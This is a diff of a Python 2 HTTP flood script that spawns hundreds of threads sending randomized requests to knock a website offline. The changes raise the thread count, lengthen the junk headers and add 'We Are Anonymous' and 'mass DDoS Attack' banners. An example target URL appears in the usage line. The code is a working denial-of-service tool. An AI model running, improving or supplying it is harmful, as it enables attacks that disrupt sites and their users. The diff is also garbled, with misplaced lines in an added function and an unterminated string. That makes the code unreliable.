@@ -3392,19 +3392,25 @@ def referer_list():
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 
+# generates a Keyword list	
+def keyword_list():
+        global keyword_top
+        keyword_top.append('D4rkN3t')
+
+
+	headers_referers.append('http://' + host + '/')
+	return(headers_referers)
+	
 #builds random ascii string
 def buildblock(size):
 	out_str = ''
 	for i in range(0, size):
-		a = random.randint(65, 90)
+		a = random.randint(65, 160)
 		out_str += chr(a)
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python2 assasintrea.py <url>'
-	print 'Atacando site, by: KeyBoard'
-	print "\a"
+	print 'Example: python2 assasintrea.py http://www.navinbcc.com/
 print \
 """
                   /\    
@@ -3456,6 +3462,7 @@ print \
                `.____.'
                  V   V 
 """""""""
+
 	
 #http request
 def httpcall(url):
@@ -3470,8 +3477,8 @@ def httpcall(url):
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
+	request.add_header('Keep-Alive', random.randint(110,160))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
@@ -3479,7 +3486,12 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
- 			print 'Flooding WebSite Port 80 with 65000-byte packets for 99999'
+            
+ 			print '                                                                    '
+ 			print '***** We Are Anonymous *****'
+ 			print '***** Your website will be down *****'
+ 			print '                                                                    '
+                                                         
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -3506,11 +3518,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Shots sends Senting" % (request_counter)
+			if (previous+150<request_counter) & (previous<>request_counter):
+				print "#~~~>D4rk Virus Sended: %d Sending more<~~~#" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n -M60 Hits are secced"
+			print "\n ~>Stopping the mass DDoS Attack<~"
 
 #execute 
 if len(sys.argv) < 2:
@@ -3521,7 +3533,8 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Attacking WebSite Port 80 with 65000-byte packets for 99999 By KeyBoard"
+		print "Starting the D4rk Attack"
+		print "WTF U R DEAD"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
@@ -3529,7 +3542,8 @@ else:
 		if url.count("/")==2:
 			url = url + "/"
 		m = re.search('http\://([^/]*)/?.*', url)
-		for i in range(500):
+		host = m.group(1)
+		for i in range(700):
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
